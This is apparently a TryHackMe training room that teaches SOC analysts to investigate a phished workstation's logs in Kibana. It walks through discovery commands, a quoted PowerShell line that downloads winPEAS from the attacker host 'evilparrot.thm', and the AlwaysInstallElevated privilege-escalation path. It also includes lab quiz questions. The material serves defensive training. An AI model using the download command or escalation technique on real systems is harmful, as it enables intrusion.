{'image': 'https://tryhackme-images.s3.amazonaws.com/room-icons/7dde754a683cbaad023aa877d5e54ab7.png', 'title': 'Servidae: Log Analysis in ELK', 'description': "Analyze the logs of an affected workstation to determine the attacker's indicators of compromise.", 'code': 'servidae', 'users': 470, 'tags': ['security', 'SIEM', 'investigation', 'ELK'], 'type': 'walkthrough', 'difficulty': 'easy', 'userCompleted': False, 'upVotes': 37, 'created': '2023-05-11T19:16:36.612Z', 'published': '2023-10-24T15:00:00.643Z', 'freeToUse': True, 'businessOnly': False, 'headerImage': 'https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/8909b4d7b9af8d9f55c6ffd894d09ef8.svg', 'creator': 'odacavoTHM', 'tasks': [{'taskTitle': 'Introduction', 'taskDesc': '<p>In this room, we will analyze the log data from a compromised workstation using the Kibana interface. Within this room\'s tasks, we will explore the components of the Elastic (ELK) Stack and gain insights into the various search and filter functions available in Kibana. Our ultimate goal will be to decipher the actions executed by a malicious actor on the affected system. Additionally, to ensure that our findings are useful in practice, we will map indicators of compromise (IOCs) identified in the logs to relevant tactics and techniques outlined in the <a href="https://attack.mitre.org/" target="_blank">MITRE ATT&amp;CK</a> framework.</p>\n\n<p><span style="font-size:24px">Room Objectives</span></p>\n\n<ul>\n<li>Get familiar with the Elastic (ELK) Stack and its components.</li>\n<li>Understand the significance of log data analysis in detecting and investigating security incidents.</li>\n<li>Get introduced to Kibana and its key functionalities for data analysis, visualization, and exploration.</li>\n<li>Gain hands-on experience with analyzing log data to identify real-world security threats and anomalies.</li>\n</ul>\n\n<p><span style="font-size:24px">Room Prerequisites</span></p>\n<ul><li>General familiarity with Windows - <i>check out the <a href="https://tryhackme.com/module/windows-fundamentals" target="_blank">Windows Fundamentals module.</a></i></li>\n<li>General context on SIEMs and how they\'re used - <i>the <a href="https://tryhackme.com/room/introtosiem" target="_blank">Introduction to SIEM</a> is an excellent room for this.</i></li></ul>\n\n<p>Once you are ready to go, click on the\xa0<b>Start Machine</b>\xa0button attached to this task! I recommend starting it now, as Elasticsearch may take up to 5 minutes to fully start up.</p>', 'taskType': 'vm', 'taskNo': 1, 'taskCreated': '2023-05-11T19:16:51.792Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '6495814c08004200606cb30a', 'questions': [{'questionNo': 1, 'question': 'Click and continue learning!<br />', 'hint': ''}]}, {'taskTitle': 'The Elastic Stack', 'taskDesc': '<p><span style="font-size:24px">The Elastic (ELK) Stack</span></p>\n\n<p>The <b>Elastic Stack</b> (commonly and formerly known as <b>ELK Stack</b>) is a collection of open-source software components developed by <a href="https://www.elastic.co/" target="_blank">Elastic</a>. The "stack" mainly consists of three core products: <b>Elasticsearch</b>, <b>Logstash</b>, and <b>Kibana</b>. When used together, the Elastic Stack becomes a very versatile toolset that can be used for a wide range of use cases, including log analysis, application performance monitoring, security analytics, and business intelligence. The stack\'s components are designed to work together seamlessly, allowing for the simplified <b>collection</b>, <b>processing</b>, and <b>analysis</b> of data from various sources.</p>\n\n<p>To further our understanding, we can discuss each component in a bit more detail:</p>\n<p style="text-align:center"><img style="width:664.667px;height:212.685px" alt="Graphic diagram of each component of the Elastic Stack - Beats, Logstash, Elasticsearch, and Kibana" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/61b0c7333a7ae900481cbfff/room-content/e4460ba18be87f20aae0ab2a835bee31.png" /></p>\n\n<p><span style="font-size:24px">Elasticsearch</span></p>\n<p><img style="width:150.667px;height:33.1448px" alt="Elasticsearch Logo" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/61b0c7333a7ae900481cbfff/room-content/045dbd13a7d8c978d6b6ce976a30a217.png" /></p>\n\n<p>As the <b>central</b> component of the Elastic Stack, <b>Elasticsearch</b> is an open-source, distributed<b> search and analytics engine</b> designed for storing and <b>indexing </b>large volumes of data. Its highly scalable system can <b>store </b>and <b>search </b>various data types, including structured, unstructured, and semi-structured data. Elasticsearch is built on top of <b><a href="https://lucene.apache.org/" target="_blank">Apache Lucene</a></b>, an open-source search engine library, and provides a simple REST API for indexing, searching, and analyzing data.</p>\n\n<p>In a typical SOC environment, an analyst could use Elasticsearch to store and index security logs,\xa0<i>such as firewall logs</i>, for fast searching and analysis.</p>\n\n<p><span style="font-size:24px">Logstash</span></p>\n<p><img style="width:134.667px;height:67.333px" alt="Logstash Logo" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/61b0c7333a7ae900481cbfff/room-content/72c3da2b9d6a673ff6df5ea18b48f389.png" /></p>\n\n<p><b>Logstash </b>is a data <b>ingestion </b>and <b>processing </b>tool primarily used to collect, process, and transform<b>\xa0</b>data from various sources and prepare it for storage in Elasticsearch or other systems. For example, Logstash can ingest and parse logs from multiple sources and systems and then send the data to Elasticsearch for indexing and storage.</p><p>Logstash is designed to handle various data types, including <b>logs</b>, <b>metrics</b>, <b>events</b>, and other structured or unstructured data. It provides an extensive collection of input, filter, and output plugins that can be used to collect data from many sources, <b>parse </b>and <b>transform </b>it, and then send it to various destinations.</p>\n\n<p>In the SOC environment example,\xa0an analyst could use Logstash to parse, transform, and standardize security logs from different antivirus and EDR solutions running in the enterprise.</p>\n\n<p><span style="font-size:24px">Kibana</span></p>\n<p><img style="width:108.667px;height:54.3331px" alt="Kibana Logo" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/61b0c7333a7ae900481cbfff/room-content/ce91baf9b81f9308f6591d8c772e5d04.png" /></p>\n\n<p><b>Kibana</b> is the interactive <b>graphical </b>and <b>visual front-end </b>powering the Elastic Stack. Kibana provides a user-friendly interface that allows users to create interactive <b>dashboards</b>, <b>visualizations</b>, and <b>reports </b>based on the data stored in Elasticsearch. Along with the ability to <b>search </b>and <b>filter </b>log events, Kibana supports a variety of charts for reporting and visualization, including line charts, bar charts, pie charts, heat maps, and many others. </p>\n\n<p>Using Kibana as an interactive interface for data stored within Elasticsearch lets you quickly gain insights and find patterns. Combined with the rest of the Elastic Stack, Kibana is a crucial solution for analyzing and making sense of large volumes of data.</p>\n\n<p>In a SOC environment, Kibana would be the front-end interface for visualizing and monitoring security events in real time, such as live graphs of network traffic, top sources of security alerts, or a map showing the geolocation of potentially malicious IP addresses.</p>\n\n<p><span style="font-size:24px">Beats</span></p>\n<p><img style="width:106.667px;height:40.2181px" alt="Beats Logo" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/61b0c7333a7ae900481cbfff/room-content/ce73427bbcc4a5a8d28f2ae70dbe46db.png" /></p>\n\n<p>Using <b>Beats </b>is not mandatory in the Elastic Stack, but they can be crucial in providing efficient and secure <b>data collection capabilities</b>. Beats are lightweight data "shippers" that collect various types of data from different sources (endpoints) and can then forward that data directly to Elasticsearch or Logstash for further processing. Organizations can tailor various Beats to specific use cases, such as collecting <b>system logs</b>, <b>network traffic data</b>, or <b>metrics </b>from servers and applications.<br /></p><p>Beats have a smaller footprint than Logstash, making them more suitable for simple use cases or where resource usage is a concern, such as IoT devices or smaller systems. Logstash, on the other hand, is a more robust and complex tool for processing and transforming data, making it more suitable for complex use cases where data requires significant transformation before being stored or analyzed.</p>\n\n<p>Now that we better understand the main components that make up the Elastic Stack, let\'s move on to a much more practical <b>hands-on scenario</b>!</p>', 'taskType': 'none', 'taskNo': 2, 'taskCreated': '2023-05-12T00:27:50.009Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'What is the name of the open-source search engine library that Elasticsearch is built on?', 'hint': ''}, {'questionNo': 2, 'question': '<p>Which component of the Elastic Stack would you use to perform advanced filtering and processing of data before it gets stored?<br /></p>', 'hint': ''}]}, {'taskTitle': 'A Compromised Workstation: Scenario', 'taskDesc': '<p><span style="font-size:24px">A Compromised Workstation: Scenario</span></p>\n\n<p><b>Bill Smith</b>, a senior Finance Executive at <i>Servidae Industries</i>, stated that he received an email from an unknown sender containing a PDF file attachment that required his action. At first glance, this email appeared legitimate, and he downloaded and opened it without any suspicion. After some time, Bill noticed his computer was acting abnormally and contacted IT Support, claiming that his workstation was slow and freezing up intermittently. Soon after, security alerts indicated suspicious network activity and unauthorized commands executed on Bill\'s workstation.</p>\n\n<p>A copy of the security alert from the organization\'s Endpoint Detection &amp; Response (EDR) solution reads:</p>\n\n<p><span style="font-family:&quot;Courier New&quot;">This is an automated security alert generated by </span><i><span style="font-family:&quot;Courier New&quot;">EndDefender EDR</span></i><span style="font-family:&quot;Courier New&quot;">. Suspicious network activity and <b>potential</b> <b>remote access</b> were detected on workstation <b>SERVIDAE-BOB-FIN-04</b> within the specified time range of: <b>May 11, 2023 @ 18:45:00.000 to May 11, 2023 @ 19:01:00.000.</b></span></p>\n\n<p>As a <b>SOC Analyst</b> at <i>Servidae Industries</i>, it\'s up to you to investigate the security alert by reviewing the logs to identify the cause and nature of the suspicious activity on Bill\'s computer. Fortunately, the organization recently implemented an <b>Elastic Stack</b> solution, and an Elastic Agent was installed to collect logs from Bill\'s workstation. We have access to the Kibana dashboard, which contains logs from the time of the incident. Let\'s walk through the investigation and determine if there were any signs of account compromise or malicious user activity.</p>', 'taskType': 'none', 'taskNo': 3, 'taskCreated': '2023-05-12T00:33:58.640Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "I'm ready to investigate!<br />", 'hint': ''}]}, {'taskTitle': 'Kibana: Basics', 'taskDesc': '<p><span style="font-size:24px">Accessing Kibana</span></p>\n\n<p>We\'re now ready to access our Kibana dashboard. Ensure you\'ve already clicked <b>Start Machine</b> in the first task. You can now start the AttackBox by pressing the <b>Start AttackBox</b> button on the top-right of this room.</p>\n\n<p>Navigate to <code>http://MACHINE_IP</code> in the AttackBox\'s web browser.</p>\n\n<p>You should see the Elastic login page. Please log in using the following credentials:</p>\n<ul>\n<li>Username: <code>elastic</code></li>\n<li>Password: <code>1N5qMlh7AYXYzjxad*02</code></li>\n</ul>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/88f16ab6afee1e7a35ba73b22b124afe.png" alt="The Kibana login panel" style="width:432px;height:451.196px" /><span style="font-size:1rem"><br /></span></p>\n\n<p>If you see a <i>Bad Gateway</i> response, give the system more time to start up Elasticsearch and Kibana. It can typically take up to 5 minutes to start each service.</p>\n\n<p><span style="font-size:24px">Discover</span></p>\n\n<p>By default, you\'ll be directed to the home dashboard, which displays several options for managing the Elastic Stack and integrations. Kibana is an incredibly powerful visualization tool, and we can\'t cover everything it offers in this room. To remain focused on our investigation, head over to the <b>Discover </b>page, which is found by clicking the left-hand menu icon and selecting <b>Discover</b> under the <b>Analytics </b>tab.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/2f13f0cb70a98921ea208d926c79b6fb.png" alt="The Kibana dashboard, highlighting the Discover tab" style="width:349px;height:443.244px" /><span style="font-size:1rem"><br /></span></p>\n\n<p>The <b>Discover </b>tab in Kibana is a user interface that allows you to explore, search, and analyze data in real time. It is a powerful tool that helps you quickly and easily find patterns, anomalies, and trends based on log data. To accomplish this, you can search for specific terms, fields, or patterns in the data and add numerous filters to narrow down the results based on criteria such as time range, source, or type.</p>\n\n<p><span style="font-size:24px">Time Filter<br /></span></p>\n<p>Systems and endpoints produce a massive amount of logs, so it\'s crucial to use filters to examine them efficiently. Kibana\'s <b>time filter</b>, for starters, enables you to narrow the records to a specific time range, making it easier to identify the events leading up to and during the incident.</p>\n\n<p><b>Note:</b> By default, Kibana uses your browser\'s local time to determine how to present log events. To achieve consistency with this walkthrough, please ensure your Timezone in Kibana is set to <b>Europe/London</b>.</p>\n\n<p>You can edit the timezone settings here: <code>http://MACHINE_IP/app/management/kibana/settings?query=time+zone</code></p><p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/3879646bef4ff59e48f8a306cea602e3.png" alt="The Kibana Settings page, highlighting the configurable Timezone option" style="width:628px;height:163.019px" /></p>\n\n<p>For this investigation, our team\'s alert mentioned that the incident occurred on <b>May 11, 2023,</b> roughly between <b>18:45-19:01</b>. Let\'s filter the dashboard to only include logs within that period.</p>\n\n<p>First, click on the <b>Date quick select</b> icon:</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/d8f9cd1aeb64b7aed1e9e078b7689d07.png" alt="The Kibana date quick selection tool" style="width:25%" /><span style="font-size:1rem"><br /></span></p>\n\n<p>By default, Kibana always shows logs from the last 15 minutes. Click the <b>Absolute </b>tab from the date window that expands. You can then select the Start date and time through the calendar and time UI or by typing in the date under the <b>Start date</b> text field. Set this to <b>May 11, 2023 @ 18:45:00.000.</b></p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/abc60efb8b6986b0bbb0eb01134a5331.png" alt="The Kibana date selection panel, highlighting the selected date and time of May 11, 2023 @ 18:45:00.000" style="width:440.077px;height:392.672px" /><span style="font-size:1rem"><br /></span></p>\n\n<p>Once set, click on the <b>now </b>button and do the same thing, this time setting an <b>Absolute </b>date and time of <b>May 11, 2023 @ 19:01:00.000</b>.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/d402434b212d840a55e191acb1e7e364.png" alt="The Kibana date selection panel, highlighting the selected date and time of May 11, 2023 @ 19:01:00.000" style="width:50%" /><br /></p>\n\n<p>Click the green <b>Update </b>button, and you should now see some logs and metrics appearing!</p>\n\n<p>That\'s a great start; we\'ve narrowed our search to the dates and times we are interested in.</p>', 'taskType': 'none', 'taskNo': 4, 'taskCreated': '2023-05-12T00:47:57.020Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>Update the date and time filter as specified. How many total <b>hits </b>were captured within the selected time period?<br /></p>', 'hint': 'The top left of the green histogram chart shows the total number of log events (hits) that occurred within the specified time range.'}]}, {'taskTitle': 'Kibana: Fields and Values', 'taskDesc': '<p><span style="font-size:24px">Available Fields</span></p>\n\n<p>Now that we have applied our desired time range, we can start looking into the different <b>fields\xa0</b>available from our dataset. In Kibana, <b>fields </b>refer to the individual data elements or attributes extracted from the log data and are available for searching, filtering, and visualization. <b>Fields </b>can be considered as\xa0<b>columns </b>in a spreadsheet, where each row represents a log event, and each column represents a specific event attribute.</p>\n\n<p>In the case of Bill\'s incident, we know that a malicious attacker <b>potentially gained remote access</b> to his workstation. Through this context, we can infer that the attacker likely ran commands on the system, attempted to elevate privileges, accessed files, attempted to maintain persistence, and more. For this investigation, there are several fields from the collected logs that may be interesting for us to filter on:</p>\n\n<ul>\n<li><b>agent.name</b>: This field indicates the name of the software agent or workstation responsible for generating the log event.</li>\n<li><b>event.category</b>: This field indicates the nature of events related to process execution or command-line activity.</li>\n<li><b>process.command_line</b>: This field captures the entire command-line string of the process. You can use this field to search for specific commands an attacker may have used.</li>\n<li><b>process.executable</b>: This field captures the path or name of the executable file associated with a process.</li>\n<li><b>process.name</b>: This field captures the name of a process.</li>\n<li><b>process.parent.name</b>: This field captures the name of the parent process.</li>\n<li><b>related.user: </b>This field captures information about the user associated with an event, such as their username, ID, or other user-specific information.</li>\n<li><b>source.ip</b>: This field captures the source IP address associated with a network event.</li>\n<li><b>destination.ip</b>: This field captures the destination IP address associated with a network event.</li>\n</ul>\n\n<p>Refer to the <a href="https://www.elastic.co/guide/en/ecs/current/ecs-field-reference.html" target="_blank">ECS Field Reference</a> for a complete guide on the ECS (Elastic Common Schema) fields.</p>\n\n<p>All the selectable fields are under the <b>Available Fields</b> header on the left-hand pane in Kibana. Find the name of one of the above fields, hover over it, and click the <b>blue plus (+)</b> icon. This will add the field as a visual column. Additionally, you can click on any field name to bring up a window highlighting the <b>Top values</b> in the current dataset for that field. You can also search for field names directly using the <b>Search field names</b> bar at the top of the left-hand pane.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/3b3850063c7f1ab5b10865fe5684e58b.png" alt="The Kibana field selection pane, highlighting the destination.ip field and its top values" style="width:50%" /></p>\n\n<p>The <b>Top values </b>feature is often a quick way to infer interesting patterns or trends in the logs. For example, we can quickly determine if any IP addresses stand out, indicating the potential use of a <a href="https://www.trendmicro.com/vinfo/us/security/definition/command-and-control-server" target="_blank">command-and-control (C2)</a> server. We can also learn which processes run most frequently on the compromised workstation or which user accounts are being accessed or created.</p>\n\n<p><b>Note:</b> Enable the fields in the order specified in the bulleted list above, as they will become helpful in analyzing the actions the malicious attacker may have conducted on Bill\'s compromised workstation.</p>', 'taskType': 'none', 'taskNo': 5, 'taskCreated': '2023-05-12T14:49:48.793Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': 'Look at the <b>Top values</b> under the <b>destination.ip</b> field. Which IP address stands out?<br />', 'hint': 'Most of the top 5 values are from within the same network or localhost. There is one external IP address that stands out.'}, {'questionNo': 2, 'question': '<p>Use an IP address lookup tool (such as iplocation.io). What country does this IP address originate from?<br /></p>', 'hint': 'Paste the IP address into a lookup tool and check the Country or Country Name field in the response.'}, {'questionNo': 3, 'question': '<p>Which <b>process name</b> is running the most frequently on the compromised workstation?<br /></p>', 'hint': 'Look under the Top Values of the process.name field.'}]}, {'taskTitle': 'Kibana: Sorting and Filtering', 'taskDesc': '<p><span style="font-size:24px">Sorting</span></p>\n\n<p>To start retracing the attacker\'s steps, we can reverse the order of the logs to show us everything from the beginning of our selected time range first, in ascending order. Click on the small  <b>Sort </b>icon next to the <b>Columns</b> tab, and choose <b>Old-New</b>. The logs will be displayed from the earliest to the latest timestamp, with the oldest logs appearing at the top of the list and the most recent ones at the bottom.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/fb3a18660095fa2606e9cdc720d9cda1.png" alt="The Kibana field sorting feature highlighting the Old-New timestamp sorting option." style="width:50%" /><br /></p>\n\n<p><span style="font-size:24px">Field Filters</span></p>\n\n<p>There are still <b>920 results</b> to examine, so let\'s filter this down to start looking at commands that were run on the compromised workstation. Because we suspect the malicious document Bill downloaded and executed was a\xa0<b>Remote Access Trojan</b>, we should have log data showing commands run by the attacker on Bill\'s behalf.</p>\n\n<p>Click on the <b>process.command_line</b> field in the left-hand panel and select "<b>Filter for field present"</b>. This filter will refine the results, showing only log events containing a value in the specified field. In this case, it allows us to only see log events that contain information about the specific commands that were run.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/f27f6e2589617a5176d471480b9dc562.png" alt="The field filtering option in Kibana highlighting the button to filter for any logs containing a process.command_line value." style="width:50%" /><br /></p>\n\n<p>After running this filter, we should see the results in the <b>date histogram pane</b> drop dramatically to only <b>174</b> log events.</p>\n\n<p>Additionally, because we are only concerned with Bill\'s workstation right now, we can click on <b>agent.name</b> and click the <b>blue plus (+)</b> icon next to Bill\'s workstation name, <code>SERVIDAE-BOB-FIN-04</code>. The total number of results will remain the same, but it is good practice if we are analyzing logs from multiple agents or sources.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/01fc7e5adb956f081ca1cd20698d3ba5.png" alt="The field filtering option in Kibana highlighting the button to filter for any logs where the agent.name matches the SERVIDAE-BOB-FIN-04 agent name." style="width:301px;height:264.879px" /><br /></p>\n\n<p>Finally, repeat the same steps to filter the <b>related.user</b> field to user <b>bsmith</b>, as we want to know what was executed by Bill Smith\'s user account.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/263ecf4431fccb9d85caee160a94b107.png" alt="The field filtering option in Kibana highlighting the button to filter for any logs where the related.user matches the bsmith user." style="width:25%" /><br /></p>\n\n<p><span style="font-size:24px">Command Line Process Analysis</span></p>\n\n<p>We should now be able to analyze the logs to see which commands were run. Look at the first log entry in the list, indicating the <b>process.name</b> as <b>powershell.exe</b>. This is immediately suspicious as it was executed by Bill\'s user account (<b>bsmith</b>).</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/aee3aae141dcf9f5ebe647b67e89c548.png" alt="The log results highlighting the powershell.exe process." style="width:946.427px;height:160.578px" /><br /></p>\n\n<p><b>Powershell.exe</b> is the executable file for Microsoft\'s Windows <b>PowerShell</b>, a command-line shell and scripting language designed for system administrators and power users. While typically used for legitimate purposes, in the context of a Finance Executive\'s compromised workstation, a log entry indicating that <b>powershell.exe</b> was used could be a cause for concern. Attackers often use PowerShell to execute malicious commands on compromised systems, as it provides a powerful interface for interacting with the system and executing scripts.</p>\n\n<p><span style="font-size:24px">Log Details</span></p>\n\n<p>Let\'s look into the details of this log entry, which we can do by clicking the <b>Expand</b> icon just to the left of the log entry.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/b9a150cc74353eae0c96d2c133e40264.png" alt="Highlighting the Expand icon within the Kibana log entry to view the details of the powershell.exe log entry." style="width:50%" /><br /></p>\n\n<p>This will open the <b>Expanded document</b> modal on the right-hand side of the page. Think of the "document" as a set of key-value pairs in JSON format, which map to each available field in the log entry. When you expand a document in Kibana, you will see all the fields in the log entry and their values.</p>\n\n<p>Once open, we can see many pieces of metadata attached to this log entry. By scrolling to the bottom, we can switch to the <b>second page</b>, showing us more info on which process was run. Specifically, the <b>message </b>and <b>process.command_line</b> fields show how the attacker likely gained initial access.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/4c476e7d501426f5875cb4fa301c866a.png" alt="The full log entry highlighting the message and process.command_line values." style="width:50%" /><br /></p>\n\n<p>By looking at the file\'s path, it is clear that Bill downloaded a PowerShell script disguised as a <b>PDF invoice</b> from the phishing email he received. We can determine that this file was a <b>PowerShell script</b>\xa0from the actual "<b>.ps1</b>" file extension. Attackers commonly use a technique called "file extension spoofing" to disguise malicious files as harmless documents to trick users into downloading and executing them.</p>\n\n<p>The presence of this file executed in the logs, combined with the remote access alert we received for Bill\'s workstation, leads us to believe that this PowerShell script gave the attacker remote access to Bill\'s workstation. Next, let\'s analyze what actions they may have performed once on the system.</p>', 'taskType': 'none', 'taskNo': 6, 'taskCreated': '2023-05-12T17:37:12.606Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': '<p>What was the <b>process ID (PID) </b>of the potentially malicious PowerShell script?<br /></p>', 'hint': 'You can find this information under the "message" field or the "process.pid" field on the third page.'}, {'questionNo': 2, 'question': '<p>What was the<b> parent process name</b> of the process that spawned powershell.exe?<br /></p>', 'hint': 'Check under "process.parent.name".'}]}, {'taskTitle': 'Indicators of Compromise: Discovery', 'taskDesc': '<p><span style="font-size:24px">Discovery</span></p>\n\n<p>The <a href="https://attack.mitre.org/" target="_blank">MITRE ATT&amp;CK</a> (Adversarial Tactics, Techniques, and Common Knowledge) framework is a globally recognized knowledge base and matrix that provides a comprehensive and structured catalogue of <b>adversary behaviours </b>and <b>techniques</b>. It is designed to help organizations understand, categorize, and mitigate the tactics and techniques used by threat actors during cyberattacks.</p>\n\n<p>In the context of MITRE ATT&amp;CK, "<b>Discovery</b>" refers to the techniques and methods used by adversaries to <b>gather information</b> about the target environment, such as its network, systems, and user accounts. It involves activities that help the attackers better understand the victim\'s infrastructure and <b>identify potential vulnerabilities</b> or <b>opportunities </b>for further exploitation.</p>\n\n<p>Scrolling down our current dataset reveals some interesting commands the attacker appears to have run once they gained the initial access:</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/97b7d5aed4b6c40aedb94e14c04ee55e.png" alt="A list of the logs containing the commands: whoami.exe, HOSTNAME.EXE, ipconfig.exe, NETSTAT.EXE, and tasklist.exe" style="width:670.351px;height:345.844px" /><br /></p>\n\n<p>Like running PowerShell, system administrators and legitimate users commonly use the above commands to manage and troubleshoot Windows systems. However, combined with other suspicious activity, these logs appear to be indicators of compromise (IOCs). The attacker is likely using these commands to gather information about the system and identify potential vulnerabilities or targets. It\'s doubtful that Bill from Finance would have run these commands in the command line.</p>\n\n<p>This is very common in the "enumeration phase" of an attack on an internal network. The information provided by running these commands can help the attacker identify the type of system they have gained access to and determine what kind of access they have to mount further attacks, gain persistence, or move laterally through the network.</p>\n\n<p><span style="font-size:24px">Downloading Files for Automated Discovery</span></p>\n\n<p>Moving further down, we see a very suspicious PowerShell cmdlet: <code>powershell -c Invoke-WebRequest</code></p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/43274ab81bdc8a0455c327cd671b1ced.png" alt="The log event containing the PowerShell Invoke-WebRequest cmdlet" style="width:965.382px;height:78px" /><br /></p>\n\n<p>The <b>Invoke-WebRequest </b>cmdlet retrieves data from a web server and can be used to download files, interact with REST APIs, and perform other HTTP/HTTPS operations. It can be used for legitimate purposes like the other commands we\'ve covered. However, attackers can also use the Invoke-WebRequest cmdlet to <b>download malicious files</b> or <b>exfiltrate data</b> from a compromised system. To verify, expand the log in the above image and look at the <b>process.command_line</b> field.</p>\n\n<p>Take a look at the entire command that was run:</p>\n<p><code>powershell  -c Invoke-WebRequest -Uri "http://evilparrot.thm/winPEASany.exe" -OutFile "winPEAS.exe"</code></p>\n\n<p>From this output, it appears the attacker used the <b>Invoke-WebRequest</b> cmdlet to download the "<b>winPEASany.exe</b>" file from the attacker\'s server, saving it as <b>winPEAS.exe</b>. If you\'re unfamiliar with <b>winPEAS</b>, a quick Google search will lead you to the <a href="https://github.com/carlospolop/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md" target="_blank">winPEAS GitHub README</a>, which describes it as a script that searches for possible paths to escalate privileges on Windows hosts. It can quickly identify potential privilege escalation paths by looking for misconfigured scheduled tasks, insecure registry keys, and other common vulnerabilities.</p>\n\n<p>Automated enumeration tools like winPEAS are quite common for an attacker to run (if they can get them on the compromised host without detection), and this is a very telling indicator of compromise on Bill\'s workstation.</p>\n\n<p><span style="font-size:24px">Registry Queries</span></p>\n\n<p>After executing winPEAS.exe, it appears the attacker found a potential avenue for privilege escalation from the script\'s output and made some queries to the Windows Registry to validate. The Windows Registry is a hierarchical database that stores configuration settings and options for the Windows operating system, users, policies, and installed applications. These queries are identified by the <code>reg query</code> command being run by <b>reg.exe</b>.</p>\n\n<p style="text-align:center"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6490641ea027b100564fe00a/room-content/3d2f8be0c7a59c8d0c97515fb5b692b7.png" alt="The two long entries containing registry query commands" style="width:929.176px;height:137.25px" /><br /></p>\n\n<p>Specifically, the attacker is querying the registry to see if the <b>AlwaysInstallElevated </b>entry is set. This entry determines whether users can install programs or updates on the system with elevated privileges, which is a security risk if set without proper controls. This is a well-known <b>privilege escalation</b> method and is documented in this <a href="https://juggernaut-sec.com/alwaysinstallelevated/" target="_blank">Juggernaut-Sec blog</a> if you\'re interested in how it works.</p>\n\n<p>Next, we\'ll look for indicators that this privilege escalation method was used. If the attacker managed to gain higher levels of access to Bill\'s system, they could perform more malicious activities, such as creating backdoors for persistent access or modifying system configurations.</p>', 'taskType': 'none', 'taskNo': 7, 'taskCreated': '2023-05-12T20:10:31.090Z', 'taskDeadline': None, 'tasksInfo': [], 'uploadId': '', 'questions': [{'questionNo': 1, 'question': "What is the domain name of the attacker's server hosting the <b>winPEAS </b>executable?<br />", 'hint': 'You can find this in the "-Uri" argument of the PowerShell command.'}, {'questionNo': 2, 'question': '<p>What is the full path of the <b>HKEY_LOCAL_MACHINE</b> registry entry that was queried?<br /></p>', 'hint': "Check under the process.command_line field! Ensure you're looking at the correct registry tree."}]}, {'taskTitle': 'Indicators of Compromise: Privilege Escalation', 'taskDesc': '<p><span style="font-size:24px">Privilege Escalation</span></p>\n\n<p>In the context of MITRE ATT&amp;CK, "<b>Privilege Escalation</b>" refers to a tactic used by adversaries to <b>obtain higher access privileges</b> within a compromised system or network. It involves using techniques and exploiting misconfigurations to elevate privileges from the initial compromised state to gain more control and access to sensitive resources, data, or functionality.</p>\n\n<p>Privilege escalation is typically performed after an adversary has gained an initial foothold or unauthorized access to a system. By escalating privileges, adversaries increase their ability to move laterally within a network, access sensitive data, execute malicious actions, and potentially evade detection by security controls. Understanding and detecting privilege escalation techniques is crucial for effective defence and mitigation against advanced attackers.</p>\n\n<p><span style="font-size:24px">Using KQL to Identify Privilege Escalation</span></p>\n\n<p>Now that we\'ve identified a privilege escalation path that the attacker likely took, we can confirm this theory by going deeper into the logs. By researching the <b>AlwaysInstallElevated</b> privilege escalation technique, it appears that it is commonly exploited by an attacker acquiring and executing a malicious <b>MSI </b>file, which is then run with elevated privileges, even if the user running the MSI file is not an administrator. An <b>MSI (Microsoft Installer)</b> file is a format used to install programs on Windows systems.</p>\n\n<p>Commonly, an attacker can craft a malicious MSI installer that will create an elevated (privileged) connection back to the attacker or install a program that creates an administrator "backdoor" account on the system with a username and password set by the attacker.</p>\n\n<p>We can use another method of filtering data in Kibana - <b>KQL (Kibana Query Language)</b>. KQL is a search method that allows you to directly search for specific fields, values, or patterns in your data and combine multiple search conditions using Boolean logic. In this scenario, we can search to pull any logs containing "<b>msi</b>" in the <b>process.command_line</b> field. We should see that the attacker acquired (downloaded) and executed a malicious MSI file if our instincts were correct. 